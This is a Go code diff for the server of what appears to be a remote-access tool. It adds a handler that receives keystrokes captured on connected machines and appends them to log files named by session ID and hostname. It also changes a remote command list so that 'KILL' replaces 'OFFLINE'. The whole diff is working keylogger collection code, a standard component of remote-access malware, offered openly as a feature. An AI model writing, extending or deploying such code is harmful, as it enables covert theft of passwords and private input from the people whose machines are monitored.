@@ -102,6 +102,31 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 			device.Uptime = pack.Device.Uptime
 		}
 	}
+	if len(pack.Device.KeyloggerData) > 0 {
+		keyloggerData := strings.Join(pack.Device.KeyloggerData, "")
+
+		filename := fmt.Sprintf("keylogger_%s_%s.log", session.UUID, pack.Device.Hostname)
+
+		if _, err := os.Stat(filename); os.IsNotExist(err) {
+			if f, err := os.Create(filename); err != nil {
+				common.Warn(nil, "KEYLOGGER", "fail", "unable to create keylogger log file", map[string]any{"error": err.Error()})
+			} else {
+				f.Close()
+			}
+		}
+		f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY, 0644)
+		if err != nil {
+			common.Warn(nil, "KEYLOGGER", "fail", "unable to open file", map[string]any{"error": err.Error()})
+		} else {
+			defer f.Close()
+			if _, err := f.WriteString(keyloggerData + "\n"); err != nil {
+				common.Warn(nil, "KEYLOGGER", "fail", "unable to write file", map[string]any{"error": err.Error()})
+			}
+			if err := f.Sync(); err != nil {
+				common.Warn(nil, "KEYLOGGER", "fail", "unable to sync file", map[string]any{"error": err.Error()})
+			}
+		}
+	}
 	common.SendPack(modules.Packet{Code: 0}, session)
 	return nil
 }
@@ -280,7 +305,7 @@ func CallDevice(ctx *gin.Context) {
 		return
 	}
 	{
-		actions := []string{`LOCK`, `LOGOFF`, `HIBERNATE`, `SUSPEND`, `RESTART`, `SHUTDOWN`, `OFFLINE`}
+		actions := []string{`LOCK`, `LOGOFF`, `HIBERNATE`, `SUSPEND`, `RESTART`, `SHUTDOWN`, `KILL`}
 		ok := false
 		for _, v := range actions {
 			if v == act {
